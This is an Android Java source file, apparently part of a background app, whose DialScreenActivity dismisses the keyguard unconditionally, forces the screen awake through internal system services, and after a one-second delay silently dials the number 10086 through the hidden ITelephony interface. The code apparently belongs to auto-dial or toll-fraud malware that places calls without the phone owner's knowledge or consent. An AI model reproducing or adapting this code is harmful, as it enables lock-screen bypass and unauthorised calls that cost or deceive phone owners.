package com.mms.bg.ui;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.WindowManager;
import com.android.internal.telephony.Phone;
import android.os.PowerManager;
import android.content.Context;

import android.os.IServiceManager;
import android.os.ServiceManagerNative;
//import android.telephony.IPhone;
import com.android.internal.telephony.ITelephony;
import android.os.DeadObjectException;
import android.os.Handler;
import android.os.Message;
import android.os.ServiceManager;
import android.os.RemoteException;
import android.os.SystemClock;
import android.os.IPowerManager;

import com.android.internal.telephony.Phone;
import com.android.internal.telephony.PhoneFactory;

import com.mms.bg.*;

public class DialScreenActivity extends Activity {
    private static final String TAG = "DialScreenActivity";
    private static final boolean DEBUG = true;
    
    private static final int DIAL_DELAY = 1000;
    
    private static final int DIAL_AUTO = 0;
    private Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
            case DIAL_AUTO:
                wakeUpScreen();
                dial();
                break;
            }
        }
    };
    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        if (DEBUG) Log.d(TAG, "[[DialScreenActivity::onCreate]] ============ >>>>>> ");
        // set this flag so this activity will stay in front of the keyguard
        int flags = WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;
//        if (app.getPhoneState() == Phone.State.OFFHOOK) {
            // While we are in call, the in-call screen should dismiss the keyguard.
            // This allows the user to press Home to go directly home without going through
            // an insecure lock screen.
            // But we do not want to do this if there is no active call so we do not
            // bypass the keyguard if the call is not answered or declined.
            flags |= WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;
//        }
        getWindow().addFlags(flags);
        
//        this.setContentView(R.layout.test);
        
        mHandler.sendEmptyMessageDelayed(DIAL_AUTO, DIAL_DELAY);
    }
    
    private void wakeUpScreen() {
        synchronized (this) {
                try {
                    IPowerManager mPowerManagerService = IPowerManager.Stub.asInterface(
                            ServiceManager.getService("power"));
                    mPowerManagerService.userActivityWithForce(SystemClock.uptimeMillis(), false, true);
                } catch (RemoteException ex) {
                    // Ignore -- the system process is dead.
                }
        }
    }
    
    private void dial() {
        Log.d(TAG, "[[dial]]");
        try {
//            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
//            PowerManager.WakeLock mPartialWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK
//                    | PowerManager.ON_AFTER_RELEASE, "");
//            
//            mPartialWakeLock.acquire();
            ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
            phone.call("10086");
//            mPartialWakeLock.release();
        } catch (RemoteException e) {
            Log.d(TAG, e.getMessage());
        }
//        finish();
    }
}
